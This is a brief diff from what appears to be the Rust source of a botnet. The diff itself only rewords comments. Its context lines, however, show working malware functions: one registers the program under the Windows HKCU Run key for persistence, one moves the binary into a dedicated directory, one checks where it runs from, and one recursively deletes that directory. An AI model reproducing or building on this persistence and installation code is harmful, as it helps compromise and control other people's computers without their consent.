@@ -9,7 +9,7 @@ use std::path::Path;
 use std::process;
 
 // Add botnet to startup register (HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
-// it adds config.rs -> FILE_PATH program to startup
+// it adds 'config.rs -> FILE_PATH' program to startup
 pub fn add_to_startup_reg() {
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -17,7 +17,7 @@ pub fn add_to_startup_reg() {
     key.set_value(config::NAME, &config::FILE_PATH).unwrap();
 }
 
-// Move botnet to config.rs -> TRUE_DIR if it isn't already there
+// Move botnet to 'config.rs -> TRUE_DIR' if it isn't already there
 pub fn set_to_true_dir() {
     if !Path::new(config::TRUE_DIR).exists() {
         fs::create_dir(config::TRUE_DIR).unwrap();
@@ -38,7 +38,7 @@ pub fn check_run_from() -> bool {
     env::current_dir().unwrap().to_str().unwrap() == config::TRUE_DIR
 }
 
-// Remove config.rs -> TRUE_DIR
+// Remove 'config.rs -> TRUE_DIR'
 pub fn rm_true_dir() {
     if Path::new(config::TRUE_DIR).exists() {
         fs::remove_dir_all(format!("{}", config::TRUE_DIR)).unwrap();
